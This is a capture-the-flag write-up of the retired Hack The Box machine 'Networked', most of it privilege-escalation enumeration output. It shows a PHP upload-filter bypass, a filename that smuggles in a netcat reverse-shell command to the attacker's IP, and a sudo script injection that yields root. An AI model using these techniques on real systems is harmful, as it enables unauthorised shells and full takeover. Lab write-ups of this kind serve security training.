---
layout: post
title:  "HTB - Networked"
date:   2020-06-07 23:00 +0100
tags: writeups
initial: 2019-09-07
---
Writeup for the retired HTB machine Networked  
Link: https://www.hackthebox.eu/home/machines/profile/203  
IP: 10.10.10.146

<!--more-->

## Recon

The box has a web service on port 80 running. So time to bust!

## gobuster
```
/index.php (Status: 200)
/uploads (Status: 301)
/photos.php (Status: 200)
/upload.php (Status: 200)
/lib.php (Status: 200)
/backup (Status: 301)
```
In the backup folder we find a complete backup of the site, so we've got the source.

Next, let's try to upload our shell to /upload. Be sure to check for ways to [trick upload filters](https://github.com/xapax/security/blob/master/bypass_image_upload.md).  
So that doesn't work either. So we're off to tricking the uploader check.  
To trick the uploader, rename the file to `file.php;.jpg` which marks the latter extension as comment.  
Boom - reverse shell!

```
./lse.sh
---
If you know the current user password, write it here for better results: 
---

        User: apache
     User ID: 48
    Password: none
        Home: /usr/share/httpd
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
       umask: 0000

    Hostname: networked.htb
       Linux: 3.10.0-957.21.3.el7.x86_64
Distribution: CentOS Linux 7 (Core)
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in an administrative groups?.............. nope
[*] usr030 Other users with shell.......................................... yes!
---
root:x:0:0:root:/root:/bin/bash
guly:x:1000:1000:guly:/home/guly:/bin/bash
---
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip
[i] usr060 Other users..................................................... skip
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[*] sud040 Can we read /etc/sudoers?....................................... nope
[*] sud050 Do we know if any other users used sudo?........................ nope
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. nope
[*] fst010 Binaries with setuid bit........................................ yes!
---
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/fusermount
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
---
[!] fst020 Uncommon setuid binaries........................................ nope
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip
[!] fst060 Can we write to any setgid binary?.............................. skip
[*] fst070 Can we read /root?.............................................. nope
[*] fst080 Can we read subdirectories under /home?......................... yes!
---
total 32
drwxr-xr-x. 2 guly guly  178 Sep  7 18:27 .
drwxr-xr-x. 3 root root   18 Jul  2 13:27 ..
lrwxrwxrwx. 1 root root    9 Jul  2 13:35 .bash_history -> /dev/null
-rw-r--r--. 1 guly guly   18 Oct 30  2018 .bash_logout
-rw-r--r--. 1 guly guly  193 Oct 30  2018 .bash_profile
-rw-r--r--. 1 guly guly  231 Oct 30  2018 .bashrc
-rw-------  1 guly guly  639 Jul  9 13:40 .viminfo
-r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly
-rw-------  1 guly guly 2298 Sep  7 18:42 dead.letter
-r--------. 1 guly guly   33 Oct 30  2018 user.txt
---
[*] fst090 SSH files in home directories................................... nope
[*] fst100 Useful binaries................................................. yes!
---
/usr/bin/curl
/usr/bin/nc
/usr/bin/socat
---
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'apache' have mail?........................................ nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. skip
[i] fst500 Files owned by user 'apache'.................................... skip
[i] fst510 SSH files anywhere.............................................. skip
[i] fst520 Check hosts.equiv file and its contents......................... skip
[i] fst530 List NFS server shares.......................................... skip
[i] fst540 Dump fstab file................................................. skip
=================================================================( system )=====
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip
[!] sys020 Does the /etc/passwd have hashes?............................... nope
[!] sys030 Can we read /etc/shadow file?................................... nope
[!] sys030 Can we read /etc/shadow- file?.................................. nope
[!] sys030 Can we read /etc/shadow~ file?.................................. nope
[!] sys030 Can we read /etc/master.passwd file?............................ nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... nope
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip
[i] sys080 System password policies in /etc/login.defs..................... skip
===============================================================( security )=====
[*] sec000 Is SELinux present?............................................. yes!
---
SELinux status:                 disabled
---
[*] sec010 List files with capabilities.................................... yes!
---
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
---
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
---
/etc/crontab:SHELL=/bin/bash
/etc/crontab:PATH=/sbin:/bin:/usr/sbin:/usr/bin
/etc/crontab:MAILTO=root
/etc/cron.d/0hourly:SHELL=/bin/bash
/etc/cron.d/0hourly:PATH=/sbin:/bin:/usr/sbin:/usr/bin
/etc/cron.d/0hourly:MAILTO=root
/etc/cron.d/0hourly:01 * * * * root run-parts /etc/cron.hourly
---
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[!] ret050 Can we write to executable paths present in cron jobs........... skip
[*] ret060 Can we write to any paths present in cron jobs.................. skip
[i] ret400 Cron files...................................................... skip
[*] ret500 User systemd timers............................................. nope
[!] ret510 Can we write in any system timer?............................... skip
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====
[*] net000 Services listening only on localhost............................ yes!
---
tcp    LISTEN     0      10     127.0.0.1:25                    *:*                  
---
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip
[i] net520 ARP table....................................................... skip
[i] net530 Namerservers.................................................... skip
[i] net540 Systemd Nameservers............................................. skip
[i] net550 Listening TCP................................................... skip
[i] net560 Listening UDP................................................... skip
===============================================================( services )=====
[!] srv000 Can we write in service files?.................................. skip
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip
[i] srv420 List /etc/xinetd.d if used...................................... skip
[i] srv430 List /etc/init.d/ permissions................................... skip
[i] srv440 List /etc/rc.d/init.d permissions............................... skip
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip
[i] srv460 List /etc/init/ permissions..................................... skip
[!] srv500 Can we write in systemd service files?.......................... skip
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
==============================================================( processes )=====
[!] pro000 Can we write in any process binary?............................. nope
[*] pro010 Processes running with root permissions......................... yes!
---
UID         PID   PPID  C STIME TTY          TIME CMD
root          1      0  0 18:23 ?        00:00:02 /usr/lib/systemd/systemd --switched-root --system --deserialize 22
root       3043      1  0 18:23 ?        00:00:00 /usr/lib/systemd/systemd-journald
root       3064      1  0 18:23 ?        00:00:00 /usr/sbin/lvmetad -f
root       3066      1  0 18:23 ?        00:00:00 /usr/lib/systemd/systemd-udevd
root       3193      1  0 18:23 ?        00:00:00 /sbin/auditd
root       3216      1  0 18:23 ?        00:00:00 /usr/lib/systemd/systemd-logind
root       3223      1  0 18:23 ?        00:00:00 /usr/bin/VGAuthService -s
root       3224      1  0 18:23 ?        00:00:01 /usr/bin/vmtoolsd
root       3229      1  0 18:23 ?        00:00:00 /usr/sbin/crond -n
root       3234      1  0 18:23 tty1     00:00:00 /sbin/agetty --noclear tty1 linux
root       3243      1  0 18:23 ?        00:00:01 /usr/bin/python -Es /usr/sbin/firewalld --nofork --nopid
root       3278      1  0 18:23 ?        00:00:00 /usr/sbin/NetworkManager --no-daemon
root       3690      1  0 18:23 ?        00:00:00 /usr/bin/python2 -Es /usr/sbin/tuned -l -P
root       3691      1  0 18:23 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
root       3693      1  0 18:23 ?        00:00:00 /usr/sbin/sshd -D
root       3694      1  0 18:23 ?        00:00:00 /usr/sbin/rsyslogd -n
root       3710      1  0 18:23 ?        00:00:00 sendmail: accepting connections
root       3983   3229  0 18:27 ?        00:00:00 /usr/sbin/CROND -n
root       4247   4135  0 18:30 pts/3    00:00:00 sudo -u root /usr/local/sbin/changename.sh
root       4248   4247  0 18:30 pts/3    00:00:00 /bin/bash -p /usr/local/sbin/changename.sh
root       4280   4248  0 18:31 pts/3    00:00:00 /bin/bash /sbin/ifup guly0
root       4294   4280  0 18:31 pts/3    00:00:00 /bin/bash
root       7023   4306  0 18:42 pts/4    00:00:00 sudo /usr/local/sbin/changename.sh
root       7024   7023  0 18:42 pts/4    00:00:00 /bin/bash -p /usr/local/sbin/changename.sh
---
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip
===============================================================( software )=====
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ yes!
---
Loaded Modules:
 core_module (static)
 so_module (static)
 http_module (static)
 access_compat_module (shared)
 actions_module (shared)
 alias_module (shared)
 allowmethods_module (shared)
 auth_basic_module (shared)
 auth_digest_module (shared)
 authn_anon_module (shared)
 authn_core_module (shared)
 authn_dbd_module (shared)
 authn_dbm_module (shared)
 authn_file_module (shared)
 authn_socache_module (shared)
 authz_core_module (shared)
 authz_dbd_module (shared)
 authz_dbm_module (shared)
 authz_groupfile_module (shared)
 authz_host_module (shared)
 authz_owner_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 cache_module (shared)
 cache_disk_module (shared)
 data_module (shared)
 dbd_module (shared)
 deflate_module (shared)
 dir_module (shared)
 dumpio_module (shared)
 echo_module (shared)
 env_module (shared)
 expires_module (shared)
 ext_filter_module (shared)
 filter_module (shared)
 headers_module (shared)
 include_module (shared)
 info_module (shared)
 log_config_module (shared)
 logio_module (shared)
 mime_magic_module (shared)
 mime_module (shared)
 negotiation_module (shared)
 remoteip_module (shared)
 reqtimeout_module (shared)
 rewrite_module (shared)
 setenvif_module (shared)
 slotmem_plain_module (shared)
 slotmem_shm_module (shared)
 socache_dbm_module (shared)
 socache_memcache_module (shared)
 socache_shmcb_module (shared)
 status_module (shared)
 substitute_module (shared)
 suexec_module (shared)
 unique_id_module (shared)
 unixd_module (shared)
 userdir_module (shared)
 version_module (shared)
 vhost_alias_module (shared)
 dav_module (shared)
 dav_fs_module (shared)
 dav_lock_module (shared)
 lua_module (shared)
 mpm_prefork_module (shared)
 proxy_module (shared)
 lbmethod_bybusyness_module (shared)
 lbmethod_byrequests_module (shared)
 lbmethod_bytraffic_module (shared)
 lbmethod_heartbeat_module (shared)
 proxy_ajp_module (shared)
 proxy_balancer_module (shared)
 proxy_connect_module (shared)
 proxy_express_module (shared)
 proxy_fcgi_module (shared)
 proxy_fdpass_module (shared)
 proxy_ftp_module (shared)
 proxy_http_module (shared)
 proxy_scgi_module (shared)
 proxy_wstunnel_module (shared)
 systemd_module (shared)
 cgi_module (shared)
 php5_module (shared)
---
[!] sof040 Found any .htpasswd files?...................................... nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip
[i] sof520 Postgres version................................................ skip
[i] sof530 Apache version.................................................. skip
=============================================================( containers )=====
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope

==================================( FINISHED )==================================

```

There's a cron job in the user home that calls `check_attack.php`, so let's analyse.  
https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt  

The script rummages in `/var/www/html/uploads"  
and because of the stuff in the article, one could try to create a file with a name like  
touch ";nc -c bash 10.10.15.195 4444"
aaaaaand whaddayaknow... max 3 minutes later, a new connection drops on my local nc.  
*User* 


## Road to root
Enum yields some interesting stuff:  

```
---
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh

```
Looking at changename.sh yields that we're interested in escaping the predefined vars.  
Once seen, it's kind of easy. Fill out all names without spaces.  
For the last var, name it `asd bash` and like magic, a root shell is spawned.